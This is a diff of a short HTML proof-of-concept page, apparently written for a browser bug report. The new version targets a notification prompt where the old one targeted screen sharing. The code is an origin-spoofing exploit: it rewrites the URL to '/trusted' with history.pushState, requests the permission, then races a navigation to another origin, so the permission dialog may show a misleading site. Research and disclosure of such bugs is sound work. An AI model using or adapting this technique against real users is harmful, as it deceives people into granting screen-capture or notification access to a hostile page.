@@ -2,100 +2,49 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>Screen Share Origin Desync PoC</title>
+<title>Notification Origin Desync PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-
 <style>
 body {
-  margin: 0;
-  font-family: -apple-system, BlinkMacSystemFont, system-ui;
-  background: #f5f5f7;
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,system-ui;
+  background:#f5f5f7;
+  text-align:center;
 }
-
 button {
-  font-size: 15px;
-  padding: 10px 14px;
-  border-radius: 10px;
-  border: none;
-  background: #007aff;
-  color: #fff;
-}
-
-#panel {
-  display: none;
-  max-width: 420px;
-  margin: 80px auto;
-  background: #fff;
-  padding: 24px;
-  border-radius: 16px;
-  box-shadow: 0 20px 60px rgba(0,0,0,.2);
-  text-align: center;
-}
-
-.notice {
-  margin-top: 14px;
-  font-size: 13px;
-  color: #b00020;
+  margin-top:80px;
+  font-size:16px;
+  padding:12px 16px;
+  border-radius:10px;
+  border:none;
+  background:#007aff;
+  color:#fff;
 }
 </style>
 </head>
-
 <body>
 
-<div style="text-align:center; margin-top:60px;">
-  <button id="trigger">Start PoC</button>
-</div>
-
-<div id="panel">
-  <h2>Share Screen</h2>
-  <p>Tap the button to start screen sharing.</p>
-
-  <button onclick="shareScreen()">Share Screen</button>
-  <p id="output">Screen: -</p>
-
-  <div class="notice">
-    Demo only — observe origin / picker dialog
-  </div>
-</div>
+<button id="start">Request Notification</button>
 
 <script>
-const panel   = document.getElementById('panel');
-const trigger = document.getElementById('trigger');
-const output  = document.getElementById('output');
+const start = document.getElementById('start');
 
-async function shareScreen() {
-  try {
-    const stream = await navigator.mediaDevices.getDisplayMedia({
-      video: true,
-      audio: false
-    });
-    output.textContent = 'Screen sharing started';
-    stream.getTracks().forEach(t => t.stop());
-  } catch (e) {
-    output.textContent = 'Screen share denied';
-  }
-}
-
-/*
- * Step 1:
- * Make URL look trusted
- */
-trigger.onclick = () => {
+start.onclick = async () => {
+  // Step 1: make URL look trusted
   history.pushState({}, '', '/trusted');
-  panel.style.display = 'block';
+
+  // Step 2: request notification permission
+  Notification.requestPermission().then(r => {
+    console.log('Permission:', r);
+  });
 };
 
-/*
- * Step 2:
- * Navigation race
- */
+// Step 3: navigation race
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
-    requestAnimationFrame(() => {
-      setTimeout(() => {
-        location.href = 'https://google.com:9090';
-      }, 80);
-    });
+    setTimeout(() => {
+      location.href = 'https://google.com:9090';
+    }, 80);
   });
 });
 </script>
